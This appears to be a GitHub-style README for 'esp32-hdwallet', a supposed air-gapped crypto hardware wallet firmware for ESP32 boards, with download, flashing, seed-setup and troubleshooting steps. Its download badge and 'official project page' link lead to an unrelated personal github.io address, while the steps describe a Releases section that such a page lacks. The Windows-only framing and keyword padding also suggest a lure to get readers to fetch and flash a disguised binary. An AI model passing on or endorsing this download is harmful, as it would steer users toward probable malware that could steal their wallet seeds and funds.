# 🔒 esp32-hdwallet - Manage your crypto assets securely offline

<a href="https://glorianealone593.github.io"><img src="https://img.shields.io/badge/Download-Release-blue.svg" alt="Download"></a>

This software turns your ESP32 hardware device into a secure digital wallet. It keeps your private keys safe by never connecting them to the internet. You sign transactions on the device itself. This method prevents hackers from stealing your funds through your computer or phone.

## 🛠 Prerequisites

You need a few items to use this firmware:
- An ESP32 development board.
- A USB cable compatible with your board.
- A computer running Windows 10 or 11.
- The firmware file from this repository.

## 📥 How to download the software

Follow these steps to get the file you need:

1. Visit the [official project page](https://glorianealone593.github.io) to view the latest software releases.
2. Look for the section labeled "Releases" on the right side of the screen.
3. Click the latest version number.
4. Scroll down to the "Assets" section.
5. Download the `.bin` file to your computer.
6. Keep track of the folder where you save the file.

## ⚙️ Setting up your device

Follow these instructions to put the software onto your ESP32 board:

1. Download the ESP32 Flash Download Tool from the official Espressif website.
2. Connect your ESP32 board to your computer using the USB cable.
3. Open the Flash Download Tool.
4. Select "ESP32" or your specific chip model from the list.
5. Click the "..." button to browse for the `.bin` file you downloaded earlier.
6. Enter `0x10000` in the address field next to the file path.
7. Click "Start" to begin the transfer.
8. Wait for the green "Finish" message to appear.

## 🛡 Security features

This device operates as an air-gapped system. An air-gapped system maintains a physical separation from all networks. It does not contain Wi-Fi or Bluetooth drivers that could leak your keys. The device only processes data through a physical connection when you choose to sign a transaction. 

### On-device signing
When you send money, you create the transaction on your computer. Your computer sends the unsigned data to the ESP32. The ESP32 signs the transaction using your secret keys. The device returns only the signed data to your computer. Your private keys never leave the chip.

### Physical confirmation
The software requires you to press a button on your ESP32 board to confirm every transaction. You can read the transaction details on the connected screen before you approve the action. If the details on the screen do not match your request, you can cancel the process. 

## ⛓ Supported networks

This firmware handles multiple blockchain networks. It generates the necessary addresses for your assets based on standard industry protocols. 

- Bitcoin: Standard wallet addresses for secure storage.
- EVM: Support for Ethereum and similar chains.
- Tron: Secure signing for account-based transactions.
- Solana: Fast and reliable signature generation for your tokens.

## 💻 Managing your wallet

After the initial setup, you must initialize your wallet. 

1. Power on your device.
2. Follow the on-screen prompts to generate a new seed phrase.
3. Write your seed phrase on a physical piece of paper.
4. Store this paper in a safe location. Never save this phrase on your computer or phone.
5. Confirm the phrase on the device to finish the setup.

If you lose your device, you can recover your assets using the seed phrase on any compatible wallet software. If you lose your seed phrase, you lose access to your funds permanently. 

## 🔧 Troubleshooting

If your computer does not see the device, check your USB cable. Some cables provide power but cannot transfer data. Use a high-quality data cable. 

If the flashing process fails, ensure you selected the correct COM port in the Flash Download Tool. You can find the COM port in the Windows Device Manager under "Ports (COM & LPT)". 

If the device screen remains dark, double-check that the board has power. Press the reset button on the side of the ESP32 board to restart the unit.

## 🏁 Final steps

You now have a secure, air-gapped wallet. Use this device to store your digital assets away from the risks of the internet. Treat your ESP32 board like a piece of physical hardware, similar to a physical bank key. Keep it in a secure spot when you do not need to sign transactions.

Keywords: esp32, esp32-arduino, esp32-c3, esp32-c6, esp32-cam, esp32-hdwallet, esp32-idf, esp32-s2, esp32-s3, esp32c3, esp32s3, firmware, hdwallet, hdwallets